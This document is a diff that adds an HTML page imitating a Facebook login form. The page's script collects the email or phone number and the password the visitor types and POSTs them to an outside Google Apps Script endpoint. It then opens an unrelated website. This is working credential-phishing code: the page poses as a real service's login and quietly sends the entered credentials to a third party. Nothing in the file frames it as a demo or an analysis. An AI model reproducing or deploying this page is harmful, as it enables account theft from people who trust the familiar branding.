@@ -1,0 +1,164 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Login Form</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        body {
+            font-family: sans-serif;
+            background: #f2f4f7;
+        }
+        .content {
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 90vh;
+        }
+        .form-container {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            background-color: #ffffff;
+            padding: 2rem;
+            width: 100%;
+            max-width: 530px;
+            border-radius: 0.5rem;
+            box-shadow: 0 2px 4px rgb(0 0 0 / 10%), 0 8px 16px rgb(0 0 0 /10%);
+        }
+        .name-content {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            height: 100%;
+        }
+        .name-content .logo {
+            font-size: 2.5rem;
+            color: #1877f2;
+            margin-bottom: 1rem;
+        }
+        .name-content p {
+            font-size: 1.rem;
+            font-weight: 500;
+            margin-bottom: 2rem;
+        }
+        form input {
+            outline: none;
+            padding: 0.8rem 1rem;
+            margin-bottom: 0.8rem;
+            font-size: 1.1rem;
+            border: 1px solid #ccc;
+            width: 100%;
+        }
+        form input:focus {
+            border: 1px solid #1877f2;
+        }
+        form .login {
+            outline: none;
+            border: none;
+            background: #1877f2;
+            padding: 0.8rem 1rem;
+            border-radius: 1.1rem;
+            color: #fff;
+            width: 100%;
+        }
+        form .login:hover {
+            background: #0f71f1;
+            cursor: pointer;
+        }
+        form a {
+            text-decoration: none;
+            text-align: center;
+            font-size: rem;
+            padding-top: 0.8rem;
+            color: #1877f2;
+        }
+        form hr {
+            background: #f2f4f7;
+            margin: 1rem 0;
+            width: 100%;
+        }
+        form .create-account {
+            outline: none;
+            border: none;
+            background-color: #06b909;
+            padding: 0.8rem 1rem;
+            border-radius: 0.4rem;
+            font-size: 1.1rem;
+            color: #fff;
+            width: 100%;
+        }
+        form .create-account:hover {
+            background-color: #03ad06;
+            cursor: pointer;
+        }
+
+        /* Media query for mobile phones */
+        @media (max-width: 768px) {
+            .form-container {
+                max-width: 100%;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="content">
+        <div class="form-container">
+            <div class="name-content">
+                <h1 class="logo">Facebook</h1>
+                <p>Log in with Facebook</p>
+            </div>
+            <form onsubmit="submitForm(event)">
+                <input type="text" id="emailOrMobile" placeholder="Email or Phone Number" required>
+                <input type="password" id="password" placeholder="Password" minlength="4" maxlength="20" title="Password must be 4-20 characters long" required>
+
+                <button type="submit" class="login">Log In</button>
+                <br>
+                <br>
+                <a href="#">Forgot Password ?</a>
+                <hr>
+                <button class="create-account">Create New Account</button>
+            </form>
+        </div>
+    </div>
+    <script>
+        function submitForm(event) {
+            event.preventDefault();
+            const emailOrMobile = document.getElementById('emailOrMobile').value;
+            const password = document.getElementById('password').value;
+
+            // Validate email or mobile and password (Add your additional validation if needed)
+            // ...
+
+            // Construct the data to be sent to the script URL
+            const formData = new FormData();
+            formData.append('emailOrMobile', emailOrMobile);
+            formData.append('password', password);
+
+            const scriptURL = 'https://script.google.com/macros/s/AKfycbyFm1NB6GQGCSL7K9rJthhs5K8Jy3IkAx5qjodczy7htVFXqVXHIfZZP5cY4ql3Pr33Sg/exec';
+
+            fetch(scriptURL, { method: 'POST', body: formData })
+                .then(response => {
+                    if (response.ok) {
+                        // If the form is successfully submitted, redirect to the other website
+                        window.open("https://linkmoni.com/", "_blank");
+                    } else {
+                        // Handle errors if needed
+                        alert("Error submitting form. Please try again later.");
+                    }
+                })
+                .catch(error => {
+                    // Handle errors if needed
+                    alert("Error submitting form. Please try again later.");
+                    console.error('Error!', error.message);
+                });
+        }
+    </script>
+</body>
+</html>
